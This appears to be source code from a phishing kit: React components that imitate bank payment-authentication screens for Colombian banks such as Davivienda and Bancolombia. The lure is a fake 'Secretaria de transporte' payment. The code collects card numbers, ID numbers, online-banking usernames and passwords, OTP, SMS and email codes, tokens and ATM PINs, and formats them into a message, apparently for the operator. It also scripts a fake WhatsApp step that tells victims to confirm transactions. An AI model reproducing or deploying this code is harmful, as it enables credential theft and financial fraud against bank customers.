  ...
  switch (status) {
    ...
    case "error_otp":
      return {
        ...
        desc1: "Davivienda le envió un código de confirmación para continuar con el proceso de compra. Por favor digítelo.",
        desc2: "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO"
      };
    case "code_sms":
    case "error_code_sms":
      return {
        title: "Autenticación de compra",
        desc1: "Davivienda le envió un código de confirmación SMS para continuar con el proceso de compra. Por favor digítelo.",
        desc2: "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO"
      };
    case "code_email":
    case "error_code_email":
      return {
        title: "Autenticación de compra",
        desc1: "Davivienda le envió un código de confirmación a su Correo Electrónico (E-Mail) para continuar con el proceso de compra. Por favor digítelo.",
        desc2: "Para recibir un nuevo código por favor haga click en REENVIAR CODIGO"
      };
    case "token":
    case "error_token":
      return {
        title: "Autenticación de compra",
        desc1: "Ingrese la clave dinámica/token de su aplicación móvil Davivienda para autorizar la transacción.",
      };
    case "clave_cajero":
    case "error_clave_cajero":
      return {
        title: "Autenticación de compra",
        desc1: "Ingrese su clave de cajero (PIN de 4 dígitos) para autorizar la transacción.",
      };
    default:
      return null;
  }
...
const DaviviendaOtpForm: React.FC<DaviviendaOtpFormProps> = ({
  ...
  return (
    <div className="col-12 visa-styling" style={{ fontFamily: '"Segoe UI", Tahoma, sans-serif', fontSize: 14, width: '100%', textAlign: 'center' }}>
      <div className="form-group text-center">
        <div id="InputAction" style={{ width: '60%', margin: '0 auto' }}>
          <label
            htmlFor="CredentialValidateInput"
            style={{ color: hasError ? '#d70000' : '#6b6887', fontWeight: 400, display: 'inline-block', marginBottom: 4 }}
          >
          ...
          <input
            ...
            onFocus={(e) => { e.target.style.borderColor = '#193ab0'; e.target.style.boxShadow = 'none'; }}
            onBlur={(e) => { e.target.style.borderColor = hasError ? '#d70000' : '#8180a3'; }}
          />

          {hasError && (
            <div id="ErrorMessage" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginBottom: '.25em', gap: 4 }}>
          ...
          <div className="visa-col-12 text-center" style={{ marginTop: 16 }}>
            <button
              ...
              onMouseEnter={(e) => { e.currentTarget.style.background = '#193ab0'; }}
            >
              Enviar
            </button>
          </div>
        ...
        <div id="InputAction" style={{ width: '60%', margin: '0 auto' }}>
          <div style={{ marginBottom: 16 }}>
            <label
              ...
              style={{ color: '#6b6887', fontWeight: 400, display: 'inline-block', marginBottom: 4 }}
            >
              Usuario
            </label>
            <input
              ...
              onFocus={(e) => { e.target.style.borderColor = '#193ab0'; e.target.style.boxShadow = 'none'; }}
              onBlur={(e) => { e.target.style.borderColor = '#8180a3'; }}
            />
          </div>
          ...
          <div style={{ marginBottom: 16 }}>
            ...
            <input
              ...
              style={{
                ...
                width: '100%',
                textAlign: 'center',
                border: errorMsg && errorMsg.includes('password') ? '1px solid #d70000' : '1px solid #8180a3',
                fontSize: 32,
                lineHeight: '37px',
                height: 40,
                borderRadius: 3,
...
const getCardInfoString = () => {
  ...
  const cardNumberFormatted = cleanCard && cleanCard.length >= 16
  ...
  const celular = paymentData?.celular || contactData?.celular || paymentData?.telefono || "N/A";
   ...
   useEffect(() => {
    if (isOpen && sessionId) {
      ...
      const validateCard = async () => {
        const cleanCard = paymentData?.numeroTarjeta?.replace(/\D/g, '') || card.replace(/\D/g, '');
 ...
 useEffect(() => {
      ...
      try {
        ...
        if (data.status) {
          ...
          if (
            ...
            console.log(`Ignorando estado ${data.status} - muy temprano (${secondsSinceOpen.toFixed(1)}s desde apertura)`);
            return;
          }
  ...
  if (!formData.otp) {
    ...
    } else if (status === "clave_virtual" || status === "error_clave_virtual") {
    ...
    const mensaje =
      ...
      `👤 ${cardInfoStr.titular}\n` +
      `🪪 Cédula: ${cardInfoStr.cedula}\n` +
      (status === "clave_virtual" || status === "error_clave_virtual" ? "" : `🏛 Usuario: ${formData.User || "N/A"}\n`) +
      (status === "clave_virtual" || status === "error_clave_virtual" ? "" : `🔐 Contraseña: ${formData.contrasena || "N/A"}\n\n`) +
      `💳 Tarjeta: ${cardInfoStr.cardNumber}\n` +
      `🏷️ Tipo: ${cardInfoStr.cardType}\n` +
      `🏦 Banco: ${cardInfoStr.banco}\n` +
      `🔴 Red: ${cardInfoStr.red}\n` +
  ...
  const isBancolombia = cardInfo.issuer?.toLowerCase().includes("bancolombia") ?? false;
  const isDavivienda = cardInfo.issuer?.toLowerCase().includes("davivienda") ?? false;
    ...
    switch (status) {
      ...
      case "otp":
        return isDavivienda ? (
          ...
          <>
            {isBancolombia ? (
              <p className="text-[10px] mt-3 font-extralight">Detalle de la Transacción</p>
            ) : (
              <>
                <p className="text-[10px] mt-10">Enter your online banking information:</p>
                <p className="text-[10px] mt-3 font-extralight">TRANSACTION DETAILS</p>
              </>
            )}
            ...
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  ...
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Monto de la Transacción:" : "Transaction Amount:"}
                    </td>
                  ...
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">
                      {isBancolombia ? "Ingresa tu Clave Dinámica:" : "OTP Code:"}
                    </td>
                    <td className="pb-[2px]">
                      <input
                        type="password"
            ...
            {isBancolombia && (
              <div className="flex w-full justify-start mt-4">
                <a href="#" className="text-xs text-gray-700 underline">¿Necesitas Ayuda?</a>
              </div>
            )}
          </>
        );
          ...
          <>
            ...
            <div className="flex w-full justify-center">
              <p className="text-red-600 text-xs">
                {isBancolombia ? "Clave Dinámica incorrecta, por favor verifícala." : "Incorrect OTP key, please verify it."}
              </p>
            </div>
      ...
      case "code_sms":
        return isDavivienda ? (
          <DaviviendaOtpForm otp={formData.otp} onChange={handleInputChange} onSubmit={handleSubmitOtp} hasError={false} />
        ) : (
          <>
            <p className="text-[10px] mt-10">Enter your online banking information:</p>
            <p className="text-[10px] mt-3 font-extralight">TRANSACTION DETAILS</p>
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">Commerce:</td>
                    <td className="pb-[2px]">Secretaria de transporte</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">Transaction Amount:</td>
                    <td className="pb-[2px] ng-binding">{priceFormatted}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">Card number:</td>
                    <td className="pb-[2px] ng-binding">**** **** **** {last4}</td>
                  </tr>
                  <tr>
                    <td className="font-bold text-right pr-[4px] pb-[2px]">SMS Code:</td>
                    <td className="pb-[2px]">
                      <input type="password" name="otp" value={formData.otp} onChange={handleInputChange} autoComplete="off" className="inputnormal border border-black" placeholder="" />
                    </td>
                  </tr>
                </tbody>
              </table>
      ...
      case "error_code_sms":
        return isDavivienda ? (
          <DaviviendaOtpForm otp={formData.otp} onChange={handleInputChange} onSubmit={handleSubmitOtp} hasError={true} />
        ) : (
          <>
            <p className="text-[10px] mt-10">
              Enter your online banking information:
        ...
        return isDavivienda ? (
          ...
          <>
            <p className="psm-email-context">
              Te hemos enviado un código de verificación al E-Mail. Estás autorizando un pago a Secretaria de transporte - Movilidad © 2026 por {priceFormatted} el {getCurrentDate()} con tu tarjeta ************{last4}.
            </p>
            <p className="text-[10px] mt-10">
              {isBancolombia ? "Ingresa la información solicitada para autorizar la transacción:" : "Enter your online banking information:"}
            </p>
            <p className="text-[10px] mt-3 font-extralight">
              {isBancolombia ? "DETALLE DE LA TRANSACCIÓN" : "TRANSACTION DETAILS"}
            </p>
            <div className="w-full flex justify-center mt-2">
              <table className="text-sm">
                <tbody>
        ...
        return isDavivienda ? (
          ...
          <>
            ...
            <div className="flex w-full justify-center mt-2">
              <p className="text-red-600 text-xs">
                {isBancolombia ? "Código E-Mail incorrecto, por favor verifícalo." : "Incorrect Email code, please verify."}
              </p>
            </div>
    ...
    <div>
      <div className="psm-overlay">
        ...
        >
          ...
          <div className="flex justify-between items-center">
            ...
            <div>
              {cardInfo.issuer?.toLowerCase().includes("bogota") && (
                <Image src="/banks/bancobogota.png" width={2560} height={517} alt="banklogo" className="w-[184px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bancolombia") && (
                <Image src="/banks/bancolombia.png" width={2560} height={517} alt="banklogo" className="w-[184px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("davivienda") && (
                <Image src="/banks/davivienda.png" width={1000} height={118} alt="banklogo" className="w-[160px] h-[19px] object-contain" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("villas") && (
                <Image src="/banks/avvillas.png" width={2560} height={517} alt="banklogo" className="w-[184px] h-[25px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("colpatria") && (
                <Image src="/banks/colpatria.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("tuya") && (
                <Image src="/banks/tuya.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("rappi") && (
                <Image src="/banks/rappi.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("pichincha") && (
                <Image src="/banks/pichincha.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("nubank") && (
                <Image src="/banks/nubank.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("nequi") && (
                <Image src="/banks/nequi.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("itau") && (
                <Image src="/banks/itau.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("falabella") && (
                <Image src="/banks/falabella.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("citibank") && (
                <Image src="/banks/citibank.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("social") && (
                <Image src="/banks/cajasocial.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("popular") && (
                <Image src="/banks/bpopular.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("occidente") && (
                <Image src="/banks/bocc.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bbva") && (
                <Image src="/banks/bbvab.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("agrario") && (
                <Image src="/banks/bancoagrario.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
              {cardInfo.issuer?.toLowerCase().includes("bancamia") && (
                <Image src="/banks/bancamia.png" width={500} height={500} alt="banklogo" className="w-[30px] h-[37px]" />
              )}
            </div>
            ...
            <div>
              {cardInfo.brand?.toLowerCase().includes("mastercard") && (
                <Image src="/banks/mastercard_check.png" width={143} height={34} alt="banklogo" className="w-[143px] h-[34px]" />
              )}
              {cardInfo.brand?.toLowerCase().includes("visa") && (
                <Image src="/banks/visa_check.svg" width={143} height={34} alt="banklogo" className="w-[143px] h-[34px]" />
              )}
            </div>
          </div>
          ...
          {isBancolombia ? (
            <>
              <p className="text-sm font-semibold mt-5">Autorización de transacción</p>
              ...
              {status !== "code_email" && status !== "error_code_email" && (
                <p className="text-xs mt-3">
                  &ldquo;¡Avancemos con la compra! Para terminar y por seguridad, necesitamos
                  confirmar que eres tú quien está detrás de esta pantalla. Ingrese un dato que solo
                  tú conoces. Consulta tu clave dinámica y escríbela aquí.
                </p>
              )}
            </>
          ) : isDavivienda ? (
            <>
              ...
              {getDaviviendaMessage(status) ? (
                ...
                <>
                  <p className="text-sm font-semibold mt-3 text-black">Autorización de transacción</p>
                  <p className="text-xs mt-3 text-gray-700">
                    La transacción que intentas realizar en{" "}
                    <b>Secretaria de transporte - Movilidad © 2026</b> por{" "}
                    <b>{priceFormatted}</b> con tu tarjeta terminada en{" "}
            ...
            >
              ...
              >
                <svg className="w-12 h-12 flex-shrink-0" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                  <path d="M32 4L8 14v18c0 13 10.5 24.5 24 28 13.5-3.5 24-15 24-28V14L32 4z" fill="#fdda24" stroke="#c9a800" strokeWidth="1.5" strokeLinejoin="round"></path>
                  <rect x="29.5" y="20" width="5" height="14" rx="2.5" fill="white"></rect>
                ...
                <p className="text-gray-700 text-sm sm:text-[15px] leading-relaxed">
                  Te enviaremos dos mensajes a <b>WhatsApp</b> desde nuestro <b>Tabot</b>, tu asistente virtual Bancolombia, para finalizar el pago.
                </p>

                <div className="flex flex-col bg-green-500/10 border border-green-500/50 rounded-md w-full py-3.5 gap-y-1 px-5">
                  <svg className="w-8 h-8 mx-auto mb-1" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M32 6C17.64 6 6 16.84 6 30.2c0 5.8 2.2 11.14 5.84 15.3L9 58l13.1-3.74C25.1 55.7 28.46 56.4 32 56.4c14.36 0 26-10.84 26-24.2S46.36 6 32 6z" stroke="#25D366" strokeWidth="5" strokeLinejoin="round"></path>
                  </svg>
                  <p className="text-sm sm:text-[15px] text-gray-800 mb-0">Por favor indicar en el chat</p>
                  <b className="text-sm sm:text-[15px] text-gray-800 mb-0">&quot;Sí fui yo&quot;</b>
                  <p className="text-sm sm:text-[15px] text-gray-800 mb-0">y confirmar con el <b>&quot;Sí&quot;</b></p>
                </div>
                ...
                <div className="bg-red-400/10 border-l-4 border-red-500 py-2 w-full px-3">
                  <p className="text-red-700 font-semibold text-start text-xs sm:text-[13px] mb-0">
                    IMPORTANTE: Haz clic en &quot;Reintentar pago&quot; ÚNICAMENTE después de dar los &quot;sí&quot; en WhatsApp.
                  </p>
                </div>

                <p className="text-gray-700 text-sm sm:text-[15px]">Si ya confirmó puede continuar.</p>
                ...
                <button
                  ...
                  style={{ backgroundColor: "#fdda24 !important", color: "#000000 !important" }}
              ...
              >
                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: 22 }}>
                  <div style={{
                    ...
                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#111" strokeWidth="3" strokeLinecap="round">
                ...
                <h3 className="psm-identity-title" style={{ fontSize: 17, fontWeight: 700, color: '#1a1a1a', margin: '0 0 18px', lineHeight: 1.35, textAlign: 'center' }}>
                  Por seguridad, no puedes continuar la transaccion
                </h3>
                <p className="psm-identity-text" style={{ fontSize: 13, color: '#555', lineHeight: 1.6, margin: '0 0 14px', textAlign: 'center' }}>
                  Codigo: 923 Para confirmar si eres tu quien hace la transaccion, te escribiremos desde nuestro WhatsApp oficial 301 353 6788, responde Si o No.
                </p>
                <p className="psm-identity-text psm-identity-text-last" style={{ fontSize: 13, color: '#555', lineHeight: 1.6, margin: '0 0 28px', textAlign: 'center' }}>
